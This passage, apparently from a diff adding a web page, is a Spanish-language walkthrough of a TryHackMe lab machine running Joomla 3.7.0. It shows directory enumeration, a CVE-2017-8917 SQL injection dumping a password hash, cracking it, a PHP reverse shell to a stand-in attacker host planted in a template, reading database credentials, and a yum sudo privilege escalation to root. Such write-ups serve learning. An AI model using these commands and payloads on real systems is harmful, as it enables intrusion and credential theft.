+<span class="o">===============================================================</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Url:<span class="w">                     </span>http://10.201.87.38
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Method:<span class="w">                  </span>GET
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Threads:<span class="w">                 </span><span class="m">100</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Wordlist:<span class="w">                </span>/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Negative<span class="w"> </span>Status<span class="w"> </span>codes:<span class="w">   </span><span class="m">404</span>
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>User<span class="w"> </span>Agent:<span class="w">              </span>gobuster/3.8
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Extensions:<span class="w">              </span>js,txt,php
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Timeout:<span class="w">                 </span><span class="nv">10s</span>
+<span class="o">===============================================================</span>
+Starting<span class="w"> </span>gobuster<span class="w"> </span><span class="k">in</span><span class="w"> </span>directory<span class="w"> </span>enumeration<span class="w"> </span><span class="nv">mode</span>
+<span class="o">===============================================================</span>
+/templates<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">238</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/templates/<span class="o">]</span>
+/media<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">234</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/media/<span class="o">]</span>
+/index.php<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">9278</span><span class="o">]</span>
+/images<span class="w">               </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">235</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/images/<span class="o">]</span>
+/modules<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">236</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/modules/<span class="o">]</span>
+/bin<span class="w">                  </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">232</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/bin/<span class="o">]</span>
+/plugins<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">236</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/plugins/<span class="o">]</span>
+/includes<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">237</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/includes/<span class="o">]</span>
+/language<span class="w">             </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">237</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/language/<span class="o">]</span>
+/README.txt<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">4494</span><span class="o">]</span>
+/components<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">239</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/components/<span class="o">]</span>
+/cache<span class="w">                </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">234</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/cache/<span class="o">]</span>
+/libraries<span class="w">            </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">238</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/libraries/<span class="o">]</span>
+/robots.txt<span class="w">           </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">836</span><span class="o">]</span>
+/tmp<span class="w">                  </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">232</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/tmp/<span class="o">]</span>
+/LICENSE.txt<span class="w">          </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">18092</span><span class="o">]</span>
+/layouts<span class="w">              </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">236</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/layouts/<span class="o">]</span>
+/administrator<span class="w">        </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">242</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/administrator/<span class="o">]</span>
+/configuration.php<span class="w">    </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">0</span><span class="o">]</span>
+/htaccess.txt<span class="w">         </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">200</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">3005</span><span class="o">]</span>
+/cli<span class="w">                  </span><span class="o">(</span>Status:<span class="w"> </span><span class="m">301</span><span class="o">)</span><span class="w"> </span><span class="o">[</span>Size:<span class="w"> </span><span class="m">232</span><span class="o">]</span><span class="w"> </span><span class="o">[</span>--&gt;<span class="w"> </span>http://10.201.87.38/cli/<span class="o">]</span>
+Progress:<span class="w"> </span><span class="m">218936</span><span class="w"> </span>/<span class="w"> </span><span class="m">882228</span><span class="w"> </span><span class="o">(</span><span class="m">24</span>.82%<span class="o">)</span>^C
+</code></pre></div>
+<h2 id="exploit">Exploit<a class="headerlink" href="#exploit" title="Permanent link">&para;</a></h2>
+<p>scan con joomscan</p>
+<div class="highlight"><pre><span></span><code>joomscan<span class="w"> </span>-u<span class="w"> </span>http://10/201.87.38
+
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Detecting<span class="w"> </span>Joomla<span class="w"> </span>Version
+<span class="o">[</span>++<span class="o">]</span><span class="w"> </span>Joomla<span class="w"> </span><span class="m">3</span>.7.0
+
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>admin<span class="w"> </span>finder
+<span class="o">[</span>++<span class="o">]</span><span class="w"> </span>Admin<span class="w"> </span>page<span class="w"> </span>:<span class="w"> </span>http://10.201.87.38/administrator/
+
+<span class="o">[</span>+<span class="o">]</span><span class="w"> </span>Checking<span class="w"> </span>robots.txt<span class="w"> </span>existing
+<span class="o">[</span>++<span class="o">]</span><span class="w"> </span>robots.txt<span class="w"> </span>is<span class="w"> </span>found
+path<span class="w"> </span>:<span class="w"> </span>http://10.201.87.38/robots.txt<span class="w"> </span>
+
+Interesting<span class="w"> </span>path<span class="w"> </span>found<span class="w"> </span>from<span class="w"> </span>robots.txt
+http://10.201.87.38/joomla/administrator/
+http://10.201.87.38/administrator/
+http://10.201.87.38/bin/
+http://10.201.87.38/cache/
+http://10.201.87.38/cli/
+http://10.201.87.38/components/
+http://10.201.87.38/includes/
+http://10.201.87.38/installation/
+http://10.201.87.38/language/
+http://10.201.87.38/layouts/
+http://10.201.87.38/libraries/
+http://10.201.87.38/logs/
+http://10.201.87.38/modules/
+http://10.201.87.38/plugins/
+http://10.201.87.38/tmp/
+</code></pre></div>
+<p>Buscamos con searchsploit vulnerabilidades de Joomla v3.7.0</p>
+<div class="highlight"><pre><span></span><code>searchsploit<span class="w"> </span>joomla<span class="w"> </span><span class="m">3</span>.7.0
+
+Exploit<span class="w"> </span>Title<span class="w">                                                                                                                                   </span><span class="p">|</span><span class="w">  </span>Path
+
+Joomla!<span class="w"> </span><span class="m">3</span>.7.0<span class="w"> </span>-<span class="w"> </span><span class="s1">&#39;com_fields&#39;</span><span class="w"> </span>SQL<span class="w"> </span>Injection<span class="w">                                                                                                      </span><span class="p">|</span><span class="w"> </span>php/webapps/42033.txt
+Joomla!<span class="w"> </span>Component<span class="w"> </span>Easydiscuss<span class="w"> </span>&lt;<span class="w"> </span><span class="m">4</span>.0.21<span class="w"> </span>-<span class="w"> </span>Cross-Site<span class="w"> </span>Scripting<span class="w">                                                                                   </span><span class="p">|</span><span class="w"> </span>php/webapps/43488.txt
+</code></pre></div>
+<p>Buscamos vulnerabilidades del exploit <a href="https://github.com/stefanlucas/Exploit-Joomla">CVE-2017-8917</a></p>
+<p>Descargamos el archivo de python</p>
+<div class="highlight"><pre><span></span><code>python3<span class="w"> </span>joomblah.py<span class="w"> </span>http://10.201.87.38/
+
+<span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Fetching<span class="w"> </span>CSRF<span class="w"> </span>token
+<span class="w"> </span><span class="o">[</span>-<span class="o">]</span><span class="w"> </span>Testing<span class="w"> </span>SQLi
+<span class="w">  </span>-<span class="w">  </span>Found<span class="w"> </span>table:<span class="w"> </span>fb9j5_users
+<span class="w">  </span>-<span class="w">  </span>Extracting<span class="w"> </span>users<span class="w"> </span>from<span class="w"> </span>fb9j5_users
+<span class="w"> </span><span class="o">[</span>$<span class="o">]</span><span class="w"> </span>Found<span class="w"> </span>user<span class="w"> </span><span class="o">[</span><span class="s1">&#39;811&#39;</span>,<span class="w"> </span><span class="s1">&#39;Super User&#39;</span>,<span class="w"> </span><span class="s1">&#39;jonah&#39;</span>,<span class="w"> </span><span class="s1">&#39;jonah@tryhackme.com&#39;</span>,<span class="w"> </span><span class="s1">&#39;$2y$10$0veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm&#39;</span>,<span class="w"> </span><span class="s1">&#39;&#39;</span>,<span class="w"> </span><span class="s1">&#39;&#39;</span><span class="o">]</span>
+<span class="w">  </span>-<span class="w">  </span>Extracting<span class="w"> </span>sessions<span class="w"> </span>from<span class="w"> </span>fb9j5_session
+</code></pre></div>
+<p>Guardamos el Hash</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>hash.txt<span class="w">     </span>
+<span class="nv">$2</span>y<span class="nv">$10$0</span>veO/JSFh4389Lluc4Xya.dfy2MF.bZhz0jVMw.V.d3p12kBtZutm
+</code></pre></div>
+<p>crack de Hash</p>
+<div class="highlight"><pre><span></span><code>john<span class="w"> </span>hash.txt<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>--format<span class="o">=</span>bcrypt
+
+john<span class="w"> </span>hash.txt<span class="w"> </span>--wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt<span class="w"> </span>
+
+Using<span class="w"> </span>default<span class="w"> </span>input<span class="w"> </span>encoding:<span class="w"> </span>UTF-8
+Loaded<span class="w"> </span><span class="m">1</span><span class="w"> </span>password<span class="w"> </span><span class="nb">hash</span><span class="w"> </span><span class="o">(</span>bcrypt<span class="w"> </span><span class="o">[</span>Blowfish<span class="w"> </span><span class="m">32</span>/64<span class="w"> </span>X3<span class="o">])</span>
+Cost<span class="w"> </span><span class="m">1</span><span class="w"> </span><span class="o">(</span>iteration<span class="w"> </span>count<span class="o">)</span><span class="w"> </span>is<span class="w"> </span><span class="m">1024</span><span class="w"> </span><span class="k">for</span><span class="w"> </span>all<span class="w"> </span>loaded<span class="w"> </span>hashes
+Will<span class="w"> </span>run<span class="w"> </span><span class="m">4</span><span class="w"> </span>OpenMP<span class="w"> </span>threads
+Press<span class="w"> </span><span class="s1">&#39;q&#39;</span><span class="w"> </span>or<span class="w"> </span>Ctrl-C<span class="w"> </span>to<span class="w"> </span>abort,<span class="w"> </span>almost<span class="w"> </span>any<span class="w"> </span>other<span class="w"> </span>key<span class="w"> </span><span class="k">for</span><span class="w"> </span>status
+spiderman123<span class="w">     </span><span class="o">(</span>?<span class="o">)</span><span class="w">     </span>
+1g<span class="w"> </span><span class="m">0</span>:00:04:04<span class="w"> </span>DONE<span class="w"> </span><span class="o">(</span><span class="m">2025</span>-09-24<span class="w"> </span><span class="m">17</span>:30<span class="o">)</span><span class="w"> </span><span class="m">0</span>.004094g/s<span class="w"> </span><span class="m">191</span>.7p/s<span class="w"> </span><span class="m">191</span>.7c/s<span class="w"> </span><span class="m">191</span>.7C/s<span class="w"> </span>thelma1..speciala
+Use<span class="w"> </span>the<span class="w"> </span><span class="s2">&quot;--show&quot;</span><span class="w"> </span>option<span class="w"> </span>to<span class="w"> </span>display<span class="w"> </span>all<span class="w"> </span>of<span class="w"> </span>the<span class="w"> </span>cracked<span class="w"> </span>passwords<span class="w"> </span>reliably
+Session<span class="w"> </span>completed.<span class="w"> </span>
+</code></pre></div>
+<table>
+<thead>
+<tr>
+<th>user</th>
+<th>pass</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>jonah</td>
+<td>spiderman123</td>
+</tr>
+</tbody>
+</table>
+<p>Probamos las credenciales encontradas</p>
+<p><img alt="alt text" src="img/image-3.png" /></p>
+<p><img alt="alt text" src="img/image-4.png" /></p>
+<p>Existen una vulnerabilidad en esta version asociado a un template que trae por defecto, pero para que la vulnerabilidad sea mas sigilosa vamos a ocupar el template que NO se esta ejecutando </p>
+<p><img alt="alt text" src="img/image-5.png" /></p>
+<p>En cualquier plantilla podemos insertar código php</p>
+<p><img alt="alt text" src="img/image-6.png" /></p>
+<p>Modificamos el index y agregamos la revshell, luego guardamos y damos click Template Preview</p>
+<div class="highlight"><pre><span></span><code>exec<span class="o">(</span><span class="s2">&quot;/bin/bash -c &#39;bash -i &gt;&amp; /dev/tcp/IP_ATTACK/443 0&gt;&amp;1&#39;&quot;</span><span class="o">)</span><span class="p">;</span>
+</code></pre></div>
+<p><img alt="alt text" src="img/image-7.png" /></p>
+<p>con ncat hemos accedido a la maquina victima</p>
+<div class="highlight"><pre><span></span><code>nc<span class="w"> </span>-nvlp<span class="w"> </span><span class="m">443</span><span class="w"> </span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">443</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">10</span>.9.244.36<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">10</span>.201.87.38<span class="o">]</span><span class="w"> </span><span class="m">50386</span>
+bash:<span class="w"> </span>no<span class="w"> </span>job<span class="w"> </span>control<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>shell
+bash-4.2$<span class="w"> </span>whoami
+whoami
+apache
+bash-4.2$
+</code></pre></div>
+<p><img alt="alt text" src="img/image-8.png" /></p>
+<p>existen 2 usuarios 
+<div class="highlight"><pre><span></span><code>bash-4.2$<span class="w"> </span>cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>sh
+cat<span class="w"> </span>/etc/passwd<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span>sh
+root:x:0:0:root:/root:/bin/bash
+jjameson:x:1000:1000:Jonah<span class="w"> </span>Jameson:/home/jjameson:/bin/bash
+</code></pre></div></p>
+<p>dentro de la ruta <code>/var/www/html</code> joomla guarda en <code>configuration.php</code> las configuración  de joomlal, hay un password vamos a probar</p>
+<div class="highlight"><pre><span></span><code>cat<span class="w"> </span>configuration.php
+&lt;?php
+class<span class="w"> </span>JConfig<span class="w"> </span><span class="o">{</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$offline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$offline_message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;This site is down for maintenance.&lt;br /&gt;Please check back again soon.&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$display_offline_message</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$offline_image</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$sitename</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;The Daily Bugle&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$editor</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;tinymce&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$captcha</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$list_limit</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;20&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$access</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$debug</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$debug_lang</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$dbtype</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;mysqli&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;localhost&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;root&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$password</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;nv5uz9r3ZEDzVjNu&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$db</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;joomla&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$dbprefix</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;fb9j5_&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$live_site</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$secret</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;UAMBRWzHO3oFPmVC&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$gzip</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$error_reporting</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;default&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$helpurl</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$ftp_host</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$ftp_port</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;21&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$ftp_user</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$ftp_pass</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$ftp_root</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$ftp_enable</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;0&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$offset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;UTC&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$mailonline</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;1&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$mailer</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;mail&#39;</span><span class="p">;</span>
+<span class="w">    </span>public<span class="w"> </span><span class="nv">$mailfrom</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">&#39;jonah@tryhackme.com&#39;</span><span class="p">;</span>
+</code></pre></div>
+<p>hemos cambiado al usuario <code>jjameson</code></p>
+<div class="highlight"><pre><span></span><code>bash-4.2$<span class="w"> </span>su<span class="w"> </span>jjameson
+su<span class="w"> </span>jjameson
+Password:<span class="w"> </span>nv5uz9r3ZEDzVjNu
+whoami
+jjameson
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="c1"># cambios la terminal para obtener mejor movimiento</span>
+script<span class="w"> </span>/dev/null<span class="w"> </span>-c<span class="w"> </span>bash
+ctrl+z
+stty<span class="w"> </span>raw<span class="w"> </span>-echo<span class="p">;</span><span class="w"> </span><span class="nb">fg</span>
+<span class="w">    </span>reset<span class="w"> </span>xterm
+
+<span class="c1"># maquina pwned</span>
+<span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>xterm
+<span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>bash
+stty<span class="w"> </span>rows
+</code></pre></div>
+<h2 id="privilege-escalation">Privilege Escalation<a class="headerlink" href="#privilege-escalation" title="Permanent link">&para;</a></h2>
+<p>con <code>sudo -l</code>, hemos encontrado que hay un binario llamado <code>yum</code> el cual tenemos opciones como root</p>
+<p><img alt="alt text" src="img/image-9.png" /></p>
+<p><a href="https://gtfobins.github.io/gtfobins/yum/">GTFO bins: yum</a></p>
+<p>Leyendo la documentación se puede utilizar la siguiente opción</p>
+<p><img alt="alt text" src="img/image-11.png" /></p>
+<div class="highlight"><pre><span></span><code><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="w"> </span>-d<span class="k">)</span>
+cat<span class="w"> </span>&gt;<span class="nv">$TF</span>/x<span class="s">&lt;&lt;EOF</span>
+<span class="s">[main]</span>
+<span class="s">plugins=1</span>
+<span class="s">pluginpath=$TF</span>
+<span class="s">pluginconfpath=$TF</span>
+<span class="s">EOF</span>
+
+cat<span class="w"> </span>&gt;<span class="nv">$TF</span>/y.conf<span class="s">&lt;&lt;EOF</span>
+<span class="s">[main]</span>
+<span class="s">enabled=1</span>
+<span class="s">EOF</span>
+
+cat<span class="w"> </span>&gt;<span class="nv">$TF</span>/y.py<span class="s">&lt;&lt;EOF</span>
+<span class="s">import os</span>
+<span class="s">import yum</span>
+<span class="s">from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE</span>
+<span class="s">requires_api_version=&#39;2.1&#39;</span>
+<span class="s">def init_hook(conduit):</span>
+<span class="s">  os.execl(&#39;/bin/sh&#39;,&#39;/bin/sh&#39;)</span>
+<span class="s">EOF</span>
+
+sudo<span class="w"> </span>yum<span class="w"> </span>-c<span class="w"> </span><span class="nv">$TF</span>/x<span class="w"> </span>--enableplugin<span class="o">=</span>y
+</code></pre></div>
+<p>Hemos obtenido el acceso al usuario root</p>
+<p><img alt="alt text" src="img/image-10.png" /></p>
+
+
+
+
+
+
+
+  
+  
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+    Made with
+    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+      Material for MkDocs
+    </a>
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.instant", "navigation.tracking", "navigation.sections", "navigation.expand", "navigation.path", "content.code.copy", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+    
+  </body>
+</html>
